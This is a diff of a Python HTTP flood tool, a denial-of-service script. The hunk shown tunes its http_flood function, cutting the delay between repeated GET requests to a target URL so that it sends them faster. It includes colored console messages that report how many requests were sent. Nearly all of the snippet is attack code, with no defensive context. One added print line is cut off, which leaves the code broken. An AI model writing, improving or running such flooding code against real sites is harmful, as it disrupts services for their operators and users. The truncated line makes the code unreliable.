@@ -167,13 +167,13 @@ def http_flood(url, duration):
     print(Fore.LIGHTBLUE_EX + f"[*] Starting HTTP flood on {url} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            time.sleep(0.3)
-            print("\033[48;5;4m HTTP flood 0n \033[0m \033[32m" +str(url)+ "\033[7m 0nfire\033[0m")
+            time.sleep(0.2)
+            print("\
             requests.get(url, timeout=1)
             request_count += 1
     except Exception as e:
-         print(Fore.LIGHTRED_EX + f"[!] Error during HTTP flood: {e}")
-         print(Fore.LIGHTGREEN_EX + f"[+] HTTP flood complete! Sent {request_count} requests.")
+        print(Fore.LIGHTRED_EX + f"[!] Error during HTTP flood: {e}")
+    print(Fore.LIGHTGREEN_EX + f"[+] HTTP flood complete! Sent {request_count} requests.")
 
 # Validation Function
 def validate_input(prompt, min_val, max_val, input_type=int):
